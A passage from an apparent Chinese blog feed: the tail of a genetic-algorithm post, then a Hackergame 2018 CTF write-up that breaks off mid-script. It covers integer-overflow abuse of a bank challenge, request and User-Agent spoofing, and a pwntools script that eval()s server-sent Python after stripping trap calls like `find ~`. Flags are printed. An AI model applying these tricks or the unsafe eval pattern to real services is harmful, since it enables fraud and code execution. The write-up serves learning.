punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过平均值表示迭代进化</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最小值表示迭代进化</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最大值表示迭代进化</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html</a></p><p><a href="https://blog.csdn.net/WFRainn/article/details/80458246" target="_blank" rel="noopener">https://blog.csdn.net/WFRainn/article/details/80458246</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;遗传算法（Genetic-Algorithm）&quot;&gt;&lt;a href=&quot;#遗传算法（Genetic-Algorithm）&quot; class=&quot;headerlink&quot; title=&quot;遗传算法（Genetic Algorithm）&quot;&gt;&lt;/a&gt;遗传算法
      
    
    </summary>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="数学建模" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>ustc-Hackergam2018</title>
    <link href="http://www.yof3ng.xyz/2018/10/16/ustc-Hackergam2018/"/>
    <id>http://www.yof3ng.xyz/2018/10/16/ustc-Hackergam2018/</id>
    <published>2018-10-16T04:31:21.000Z</published>
    <updated>2018-10-16T06:10:45.433Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="中科大-Hackergame2018-write-up"><a href="#中科大-Hackergame2018-write-up" class="headerlink" title="中科大-Hackergame2018 write-up"></a>中科大-Hackergame2018 write-up</h1><blockquote><pre><code>这个比赛主要面向新生，较为友好，链接：https://hack.lug.ustc.edu.cn/官方writeup:&lt;https://github.com/ustclug/hackergame2018-writeups&gt;此场比赛充满了猫咪与flxg（废理兴工），虽然作为一个老腊肉去做小鲜肉的题很不好意思，但该做的还是要做啦。</code></pre></blockquote><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><blockquote><p>打开<a href="http://202.38.95.46:12002/" target="_blank" rel="noopener">题目链接</a>之后，题面如下图：</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02b2fdc456.png" alt=""></p><blockquote><pre><code>Key的输入框限制了长度，通过开发者工具修改页面源码，或者抓包发送 hackergame2018获取 flag:The flag is: flag{Hackergame2018_Have_Fun!}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02bfb8a96d.png" alt="">  </p><h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h2><blockquote><p>这一题虽然表面上是对中科大新生有优势，但是实际上是个社工题。考验学生的搜索能力，信息收集能力。毕竟信安肯定是要跟这个打交道的啦。简单搜索（百度，必应，谷歌）一下，提交得到flag：</p><p>flag{G00G1E-is-always-YOUR-FRIEND} </p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02da7e38a4.png" alt=""></p><h2 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h2><blockquote><pre><code>这一题实际上考验学生的拼图能力，只不过是花的实时间长短而已，需要注意的就是字母和数字的分辨，可能有的其他题目会需要一个前面的过程来获取到零碎的图片，再到这一步拼图。拼完图可以得到flag：​    flag{H4PPY_1M4GE_PR0CE551NG}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02e508ccdd.png" alt=""></p><h2 id="猫咪和键盘"><a href="#猫咪和键盘" class="headerlink" title="猫咪和键盘"></a>猫咪和键盘</h2><blockquote><pre><code>题目是一份经过了乱序处理的代码，虽然说是乱序，但还是有一定规律的，比如说可以看出跟列有关系，某列整体移到另一个位置之类的。</code></pre><p>简单来说，要还原整个项目是不太可能实现的，所以我们需要根据出题人给我们的路，认真抉择，然后行动。比如源码首部的author，name，url等信息，可以谷歌得到项目的一部分源码，再还原一部分关键性的代码，理解逻辑即可。</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0378f2d30c.png" alt=""></p><p>  <img src="https://i.loli.net/2018/10/12/5bc0317a3d624.png" alt=""></p><blockquote><pre><code>根据name，author可以在搜到位于github的项目源码，前一部分自定义函数是相同的，主函数不同，我们还原一下ABC，BAC，CAB：ABC：FfQ47if9Zxw9jXE68VtGABAC：JDk6Y6Xc88UrUtpK3iF8pCAB：7BMs4y2gzdG8Ao2gv6aiJ根据主函数逻辑可以得到flag是像下面这样拼接的：printf(&quot;%s%s%s%s %s%s%s%s%s%s%d %s%d%s&quot;，&quot;f&quot;,&quot;l&quot;,&quot;a&quot;,&quot;g&quot;,ABC,&quot;&quot;,BAC,&quot;&quot;,CAB,&quot;}&quot;,&quot;type_printf&quot;,&quot;_&quot;,&quot;}&quot;)flag{FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125type_printf92}</code></pre></blockquote><h2 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h2><blockquote><pre><code>这题的话主要是给新生扩充一个知识点：office套件实际上都属于zip压缩包，将后缀改为zip就能以压缩包的形式打开office文档，然后看见其文件结构。</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc03a0493152.png" alt=""></p><h2 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h2><p><img src="https://i.loli.net/2018/10/12/5bc03afaf3184.png" alt=""></p><blockquote><pre><code>又是一通过非法获取钱财买flag的题目呢，经过简单的尝试输入后发现没什么特殊的漏洞，不能以科学计数（如 0e516516）的方式作为切入点，改cookie只能重置账户，买1/4个flag跟没买似的。</code></pre><p>​    仔细看可以发现，理财时间有下限，但是没有上限，先兑换TDSU，输一个大数试试看，oh一不小心就溢出了：</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc03c707e924.png" alt=""></p><blockquote><pre><code>但是我们需要控制溢出的收益，不然收益为负，够你受的了。通过控制输入的大数的大小来调节：922337203685477500</code></pre></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc03da7f11cd.png" alt=""></p><blockquote><p>The flag is: <code>flag{Evil_Integer._Evil_Overflow.}</code> </p><p>护网杯中那个辣条之王溢出的题比较精妙，需要通过条件竞争的手法（即多线程同时购买，同一时间多次购买只需要一次付钱），再判断溢出点，从而getflag：题解 <a href="https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg</a></p></blockquote><h2 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h2><blockquote><p>这就是那个坑到无数老少爷们，一时风头无俩的黑曜石浏览器(HeiCore)，确实出题人比较良心，为这个题目甚至专门写了一个前端页面来迷惑各位CTFer，这个黑曜石浏览器主页是在百度上不能搜索到的，在必应和谷歌上可以查到，很明显这个页面很不正经，简直是在嘲笑各位CTFer的智商嘛是不是？</p><p>好回到题目，实际上我们也做了比较久，尝试过各种方法之后回到了原点：黑曜石浏览器主页，这个主页除了假正经之外还有就是，不能查看源码，用谷歌的开发者工具看主页时会返回404。那么问题已经比较明显了，这里就是出题人的阻碍，为啥要阻碍，因为关键在这里，拿到关键的东西之后我们就可以去题目那里获取flag了。</p><p>谷歌用不了我们用火狐嘛，来看看network，看看源码：</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc0424f6bfaf.png" alt=""></p><blockquote><pre><code>哦嚯，获得了一个user-agent，题目页面不是需要通过黑曜石浏览器访问吗，既然我们没有黑曜石浏览器这个东西，当然也可以通过user-agent来代表我们是黑曜石浏览器的身份咯，构造请求，加上user-agnet，getflag。</code></pre><p>The flag is: <code>flag{H3ic0re_49.1.2623.213_sai_kou}</code> </p></blockquote><h2 id="回到过去"><a href="#回到过去" class="headerlink" title="回到过去"></a>回到过去</h2><pre class=" language-shell"><code class="language-shell">#input_sequenceqedaflag{.a44a2b8a3d9b2c               #关键在这一行最后的c是保留不保留c44039f93345}.2m3                    #开始换行2m52m12                    #切换到第二行s/4/t                #将当前行的第一个4替换为tqq</code></pre><blockquote><pre><code>这一题介绍了一下ed编辑器的使用，给出了一个文件如上，里面有键盘记录，实际上根据键盘记录，利用ed编辑器重写一遍就可获得flag，但是这个还是有一个坑点，那就是那个多出来的 ESC特殊符，刚开始在MobaXterm上面自带的ed做题，发现 2m3之类的换行命令无法实现，后来使用云服务器进行一波操作得到flag：</code></pre><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><blockquote><pre><code>这一题有两个小题，充满哲学。考察的是客户端错误相应代码和 “递茶”协议。。。</code></pre><p>第一题通过查看network，可以看到status code里面有 <code>418 I AM A TEAPOT</code>，正好问我是谁嘛，把TEAPOT填进去，getflag1:<br>flag{i_canN0t_BReW_c0ffEE!} </p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc0460ef19b2.png" alt=""></p><p><img src="https://i.loli.net/2018/10/12/5bc0464a1b3a2.png" alt=""></p><blockquote><pre><code>然后可以获取第二小题的链接，简单查看一下，响应如下：</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">#这年头给大佬递茶都不简单了Brewing tea is not so easy.Try using other methods to request this page.#试试post请求，响应如下：The method "POST" is deprecated.See RFC-7168 for more information.#试试brew请求，响应如下：Please check if there is anything missing in your header.</code></pre><blockquote><p>结合两题的信息 I AM A TEAPOT  + brew tea + RFC-7168搜索一下，可以得到说明文档：</p><pre><code>https://tools.ietf.org/html/rfc7168</code></pre><p>根据文档构造请求header里面的Content-Type: message/teapot，发送过去得到如下信息:</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc04932d86c3.png" alt=""></p><blockquote><p>根据返回的信息，我们需要将构造的请求发送到另一个url,即在原url后面加上递茶类型black_tea:</p><p>/the_super_great_hidden_url_for_brewing_tea/black_tea</p><p>getflag:</p><p><img src="https://i.loli.net/2018/10/12/5bc049bab0ba3.png" alt=""></p></blockquote><h2 id="家里有矿"><a href="#家里有矿" class="headerlink" title="家里有矿"></a>家里有矿</h2><blockquote><p>提示：</p><ol><li>本题的浏览器“挖矿”只为演示性目的，几乎不占资源。我们不会以任何形式盗取或浪费大家电脑的算力。</li><li>本题如果使用程序求解，对于普通配置的个人电脑，在解法正确且最优的情况下，求解程序的期望运行时间不会超过几分钟。</li></ol><p>该题并不是常规的web 题，解题过程不涉及注入、XSS、敏感文件泄露、弱类型等安全问题。 </p><p>但是我暂时不会，所以待更新。</p></blockquote><h2 id="秘籍残篇"><a href="#秘籍残篇" class="headerlink" title="秘籍残篇"></a>秘籍残篇</h2><blockquote><pre><code>从这题就开始涉及古文化，玄学知识了。这题也是一个两小题的题目，第一题给出了一段malbolge语言的代码在文件中。一个骚操作。。直接用火狐浏览器打开文件，然后调整页面大小(%30)，宽度得到以下嘲讽CTFer的图案:</code></pre><p><img src="https://i.loli.net/2018/10/12/5bc052d4be6b1.png" alt=""><br>   ​<br>flxg{University_Ridiculous}<br>   ​<br>第二题待更新。</p></blockquote><h2 id="猫咪遥控器"><a href="#猫咪遥控器" class="headerlink" title="猫咪遥控器"></a>猫咪遥控器</h2><blockquote><p>为了报复猫咪把自己的代码打乱（见：猫咪与键盘），D 同学把猫咪遥控器绑在可以上（UP）下（DOWN）左（LEFT）右（RIGHT）移动的三轴机械臂上，开始使用树莓派（一款基于 Linux 的单片机计算机）控制三轴机械臂，进而控制猫咪在草地上跑来跑去。 </p><p>此题给出的txt文件中有 U(UP),D(DOWN),L(LEFT),R(RIGHT)，即上下左右咯，既然是让猫咪按这个跑，很简单就是画出路线图嘛，写一个简单的python脚本，利用tutle海龟库写，getflag：</p><p>flag{MeowMeow}</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> turtle <span class="token keyword">as</span> T<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'seq.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>T<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">'U'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><blockquote><p>运行结果:</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc0561d47cad.png" alt=""></p><h2 id="她的诗"><a href="#她的诗" class="headerlink" title="她的诗"></a>她的诗</h2><blockquote><p>题目给了一个poem.zip，包含一个python解密脚本和一个包含加密后诗的文件。根据解密脚本可以知道是uuencode，开始过于相信这个解密脚本，没想到出题人在这儿动手脚</p><pre class=" language-python"><code class="language-python">   <span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>   <span class="token comment" spellcheck="true"># This script helps you decode "her poem"</span>   <span class="token keyword">from</span> codecs <span class="token keyword">import</span> decode   fin <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>   fout <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.out"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> fin<span class="token punctuation">:</span>      data <span class="token operator">=</span> <span class="token string">"begin 666 &lt;data>\n"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" \nend\n"</span>      decode_data <span class="token operator">=</span> decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uu"</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decode_data<span class="token punctuation">)</span>      fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decode_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>   fin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>   <strong>重点！在线解密密文即可得到真正的flag</strong>，flag分散藏在每行的头部，但是flag少了一个n需要自行添加在最后面补全为一个单词fun。</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc057e2cd0ed.png" alt=""></p><h2 id="猫咪克星"><a href="#猫咪克星" class="headerlink" title="猫咪克星"></a>猫咪克星</h2><blockquote><p>nc 202.38.95.46 12009 </p><p>蟒蛇是一种非常容易使用的编程语言，考验你像不像蟒蛇的标准就是给你一些 Python 3 表达式。如果你能正确计算出来，你就通过了验证。 </p><p>简单来说就是要在30秒内完成指定次数表达式的计算，然后可以得到服务器给出的flag，但是坑爹的是表达式中有一些特殊函数，类似于目录遍历 find ~,sleep(100),exit()，所以这种东西我采取了替换的方法。<br>​<br>因为print函数在python3和python2中不同，而我需要使用python2中的pwntools库（python3的socket不知为何无用），同时拥有python3的print函数特性，这时候就需要:</p><p>from _ _ future _ _ import print_function</p><p>引入python3 print函数。</p><p>最终脚本如下(脚本比较简陋，可能需要多跑几次才能出flag)：</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.95.46"</span><span class="token punctuation">,</span><span class="token number">12009</span><span class="token punctuation">)</span>getit <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sleep(100)'</span><span class="token punctuation">,</span><span class="token string">'int(1)'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'exit()'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'find ~'</span><span class="token punctuation">,</span><span class="token string">'echo 1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__import__('time')."</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    key <span class="token operator">=</span> eval<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>脚本运行结果如下：</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc05b09d0ecf.png" alt=""></p><h2 id="猫咪电路"><a href="#猫咪电路" class="headerlink" title="猫咪电路"></a>猫咪电路</h2><blockquote><p>当年玩的minercraft被做成了题目，好吧，红石电路，这是一个存档，需要我们按规律输入信号，然后直到光柱亮起，正确的信号即为flag:</p><p>flag{0110101000111100101111111111111111111010} </p></blockquote><h2 id="FLXG-的秘密"><a href="#FLXG-的秘密" class="headerlink" title="FLXG 的秘密"></a>FLXG 的秘密</h2><blockquote><p>题目有点长，我总结一下，给出的文件中是伏羲六十四卦的卦象，简单搜索一下可以知道，伏羲六十四卦可以跟二进制扯上关系，六十四卦分别对应二进制000000-111111，对应关系如下:</p></blockquote><pre class=" language-shell"><code class="language-shell">'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110', '否': '000111', '谦': '001000', '艮': '001001', '蹇': '001010', '渐': '001011', '小过': '001100', '旅': '001101', '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100', '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011', '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010', '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001', '既济': '101010', '家人': '101011', '丰': '101100', '离': '101101', '革': '101110', '同人': '101111', '临': '110000', '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101', '兑': '110110', '履': '110111', '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110', '乾': '111111'</code></pre><blockquote><p>写一个python脚本将那个文件中的卦象分别解成二进制，可以发现bit数正好是4039032，可以整除8（8bit为1byte）。到这基本上可以判断思路正确。</p><p>脚本如下:</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> respecial <span class="token operator">=</span> <span class="token triple-quoted-string string">'''乾﹑坤﹑屯﹑蒙﹑需﹑讼﹑师﹑比﹑小畜﹑履﹑泰﹑否﹑同人﹑大有﹑谦﹑豫﹑随﹑蛊﹑临﹑观﹑噬嗑﹑贲﹑剥﹑复﹑无妄﹑大畜﹑颐﹑大过﹑坎﹑离﹑咸﹑恒﹑遁﹑大壮﹑晋﹑明夷﹑家人﹑睽﹑蹇﹑解﹑损﹑益﹑夬﹑姤﹑萃﹑升﹑困﹑井﹑革﹑鼎﹑震﹑艮﹑渐﹑归妹﹑丰﹑旅﹑巽﹑兑﹑涣﹑节﹑中孚﹑小过﹑既济﹑未济'''</span><span class="token comment" spellcheck="true">#二进制顺序的卦象</span>guashu <span class="token operator">=</span> <span class="token triple-quoted-string string">'''坤、剥、比、观、豫、晋、萃、否、谦、艮、蹇、渐、小过、旅、咸、遁、师、蒙、坎、涣、解、未济、困、讼、升、蛊、井、巽、恒、鼎、大过、姤、复、颐、屯、益、震、噬嗑、随、无妄、明夷、贲、既济、家人、丰、离、革、同人、临、损、节、中孚、归妹、睽、兑、履、泰、大畜、需、小畜、大壮、大有、夬、乾'''</span><span class="token keyword">def</span> <span class="token function">Getword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    s<span class="token operator">=</span>special<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'﹑'</span><span class="token punctuation">)</span>    s2 <span class="token operator">=</span> guashu<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"、"</span><span class="token punctuation">)</span>    diction <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'G://数据//ctf赛题//中科大ctf//flxg的秘密.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        strings2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> strings2<span class="token punctuation">:</span>            strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> set<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#因为卦象中存在一个字或者两个字的卦象，jieba分词库不准确，就用/来区别</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        diction<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>strings2<span class="token punctuation">.</span>count<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        strings2 <span class="token operator">=</span> strings2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2 <span class="token operator">=</span> Getword<span class="token punctuation">(</span><span class="token punctuation">)</span>    finalbin <span class="token operator">=</span><span class="token string">''</span>    finaldiclist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dicts<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> diction<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token operator">+=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">6</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bits='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalstrings <span class="token operator">=</span> strings2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> finalstrings<span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            finaldiclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#建立卦象与二进制的关系字典</span>    nice <span class="token operator">=</span><span class="token number">0</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s2<span class="token punctuation">:</span>        dicts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> format<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>finaldiclist<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#按字典解密写入文件</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> finaldiclist<span class="token punctuation">:</span>        finalbin<span class="token operator">+=</span>dicts<span class="token 